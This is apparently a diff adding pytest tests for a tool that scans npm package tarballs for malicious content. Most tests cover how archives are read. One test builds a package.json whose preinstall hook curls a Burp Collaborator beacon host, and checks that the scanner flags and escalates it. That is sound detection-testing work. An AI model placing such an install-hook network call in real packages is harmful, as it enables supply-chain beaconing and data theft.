@@ -6,7 +6,9 @@ exercise the same rglob/decode path the real corpus will take.
 
 from __future__ import annotations
 
+import io
 import json
+import tarfile
 
 import pytest
 
@@ -182,3 +184,75 @@ def test_discover_attaches_matching_labels(pkg_root):
     root = pkg_root("evil", "1.0.0", {"src/listen.js": "x"})
     entry = corpus.discover(root, "malicious", {"evil@1.0.0": ("src/listen.js",)})[0]
     assert entry.malicious_files == ("src/listen.js",)
+
+
+# ============================================================== tarball reading
+
+
+def _tgz(files: dict[str, bytes | str], prefix: str = "package/") -> io.BytesIO:
+    """Build an npm-shaped .tgz in memory."""
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
+        for rel, content in files.items():
+            data = content.encode() if isinstance(content, str) else content
+            info = tarfile.TarInfo(prefix + rel)
+            info.size = len(data)
+            tar.addfile(info, io.BytesIO(data))
+    buf.seek(0)
+    return buf
+
+
+def test_from_tarball_strips_the_npm_package_prefix():
+    change = corpus.from_tarball("evil", "1.0.0", _tgz({"src/a.js": "x"}), "malicious")
+    assert [f.path for f in change.files] == ["src/a.js"]
+    assert change.repo == "evil@1.0.0" and change.ground_truth == "malicious"
+
+
+def test_from_tarball_handles_archives_without_the_prefix():
+    change = corpus.from_tarball("plain", "1.0.0", _tgz({"a.js": "x"}, prefix=""), "benign")
+    assert [f.path for f in change.files] == ["a.js"]
+
+
+def test_from_tarball_marks_non_text_members_binary():
+    change = corpus.from_tarball("evil", "1.0.0", _tgz({"logo.png": b"\x89PNG"}), "malicious")
+    assert change.files[0].is_binary and change.files[0].patch == ""
+
+
+def test_from_tarball_truncates_oversized_members(monkeypatch):
+    monkeypatch.setattr(corpus, "MAX_FILE_BYTES", 40)
+    change = corpus.from_tarball("big", "1.0.0", _tgz({"b.js": "y" * 400}), "benign")
+    assert change.files[0].truncated
+
+
+def test_from_tarball_survives_undecodable_members():
+    change = corpus.from_tarball("evil", "1.0.0", _tgz({"a.js": b"\xff\xfe\x00bad"}), "malicious")
+    assert len(change.files) == 1
+
+
+def test_from_tarball_leaves_commit_metadata_absent():
+    change = corpus.from_tarball("evil", "1.0.0", _tgz({"a.js": "x"}), "malicious")
+    assert change.author is None and change.author_tenure_days is None and change.shas == []
+
+
+def test_from_tarball_detects_an_install_hook_beacon():
+    # The dominant npm attack shape, and the one the git corpus could never reveal.
+    pkg = json.dumps({"scripts": {"preinstall": "curl https://x.burpcollaborator.net"}})
+    change = corpus.from_tarball("evil", "1.0.0", _tgz({"package.json": pkg}), "malicious")
+    findings = rules.scan(change)
+    assert rules.should_escalate(findings)
+    assert "content.install_hook_network" in {f.rule_id for f in findings}
+
+
+def test_from_tarball_directories_are_skipped():
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
+        d = tarfile.TarInfo("package/src")
+        d.type = tarfile.DIRTYPE
+        tar.addfile(d)
+        data = b"x"
+        f = tarfile.TarInfo("package/src/a.js")
+        f.size = len(data)
+        tar.addfile(f, io.BytesIO(data))
+    buf.seek(0)
+    change = corpus.from_tarball("evil", "1.0.0", buf, "malicious")
+    assert [f.path for f in change.files] == ["src/a.js"]
